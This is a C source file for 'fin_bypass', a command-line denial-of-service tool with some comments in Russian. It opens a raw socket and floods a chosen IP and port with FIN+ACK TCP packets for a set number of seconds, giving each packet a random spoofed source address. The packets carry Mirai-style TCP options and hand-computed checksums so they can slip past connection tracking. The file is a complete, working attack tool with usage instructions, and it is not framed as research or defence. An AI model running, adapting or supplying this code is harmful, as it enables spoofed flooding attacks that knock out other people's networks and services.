#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <errno.h>
#include <time.h>
#include <stdint.h>

// tcp options
#define PROTO_TCP_OPT_NOP   1
#define PROTO_TCP_OPT_MSS   2
#define PROTO_TCP_OPT_WSS   3
#define PROTO_TCP_OPT_SACK  4
#define PROTO_TCP_OPT_TSVAL 8

// random number generator
static uint32_t x, y, z, w;

void rand_init(void) {
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) {
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

// checksum functions
uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return ~sum;
}

uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1) {
        sum += *buf;
        buf++;
        len -= 2;
    }
    if (len == 1)
        sum += *((uint8_t *) buf);
    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;
    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);
    return ((uint16_t) (~sum));
}

// fin bypass - обходит connection tracking с FIN флагом
void fin_bypass(uint32_t target_ip, uint16_t dport, int duration) {
    int fd;
    char *pkt = malloc(128);
    struct iphdr *iph = (struct iphdr *)pkt;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    uint8_t *opts = (uint8_t *)(tcph + 1);
    struct sockaddr_in sin;
    
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
        perror("socket");
        return;
    }
    
    int one = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(int)) == -1) {
        perror("setsockopt");
        close(fd);
        return;
    }
    
    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = target_ip;
    sin.sin_port = htons(dport);
    
    // ip header
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + 20);
    iph->id = htons(0xffff);
    iph->ttl = 64;
    iph->frag_off = htons(1 << 14);
    iph->protocol = IPPROTO_TCP;
    iph->saddr = 0;
    iph->daddr = target_ip;
    
    // tcp header - FIN+ACK
    tcph->source = htons(0xffff);
    tcph->dest = htons(dport);
    tcph->seq = htons(0xffff);
    tcph->ack_seq = htons(0xffff);
    tcph->doff = 10;
    tcph->fin = 1;  // FIN flag - закрытие соединения
    tcph->ack = 1;  // ACK flag
    tcph->window = htons(65535);
    
    // tcp options
    *opts++ = PROTO_TCP_OPT_MSS;
    *opts++ = 4;
    *((uint16_t *)opts) = htons(1400 + (rand_next() & 0x0f));
    opts += sizeof(uint16_t);
    *opts++ = PROTO_TCP_OPT_SACK;
    *opts++ = 2;
    *opts++ = PROTO_TCP_OPT_TSVAL;
    *opts++ = 10;
    *((uint32_t *)opts) = rand_next();
    opts += sizeof(uint32_t);
    *((uint32_t *)opts) = 0;
    opts += sizeof(uint32_t);
    *opts++ = 1;
    *opts++ = PROTO_TCP_OPT_WSS;
    *opts++ = 3;
    *opts++ = 6;
    
    printf("fin bypass attack on %s:%d for %d seconds\n", 
           inet_ntoa(*(struct in_addr*)&target_ip), dport, duration);
    
    time_t start_time = time(NULL);
    while (time(NULL) - start_time < duration) {
        iph->saddr = rand_next();
        iph->id = rand_next() & 0xffff;
        tcph->source = rand_next() & 0xffff;
        tcph->seq = rand_next();
        tcph->ack_seq = rand_next();
        
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        tcph->check = 0;
        tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + 20), sizeof(struct tcphdr) + 20);
        
        sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct tcphdr) + 20, MSG_NOSIGNAL, 
               (struct sockaddr *)&sin, sizeof(sin));
    }
    
    close(fd);
    free(pkt);
    printf("fin bypass finished\n");
}

void usage(void) {
    printf("usage: fin_bypass -i <target_ip> -p <target_port> -d <seconds>\n");
    printf("purpose: bypasses connection tracking with FIN flag (connection close)\n");
    printf("example: fin_bypass -i 192.168.1.1 -p 80 -d 60\n");
}

int main(int argc, char *argv[]) {
    uint32_t target_ip = 0;
    uint16_t port = 0;
    int duration = 0;
    int opt;
    
    if (argc != 7) {
        usage();
        return 1;
    }
    
    while ((opt = getopt(argc, argv, "i:p:d:")) != -1) {
        switch (opt) {
            case 'i':
                target_ip = inet_addr(optarg);
                if (target_ip == INADDR_NONE) {
                    printf("invalid ip address: %s\n", optarg);
                    return 1;
                }
                break;
            case 'p':
                port = atoi(optarg);
                if (port == 0) {
                    printf("invalid port: %s\n", optarg);
                    return 1;
                }
                break;
            case 'd':
                duration = atoi(optarg);
                if (duration <= 0) {
                    printf("invalid duration: %s\n", optarg);
                    return 1;
                }
                break;
            default:
                usage();
                return 1;
        }
    }
    
    if (target_ip == 0 || port == 0 || duration == 0) {
        usage();
        return 1;
    }
    
    if (getuid() != 0) {
        printf("error: must run as root for raw sockets\n");
        return 1;
    }
    
    rand_init();
    fin_bypass(target_ip, port, duration);
    
    return 0;
}
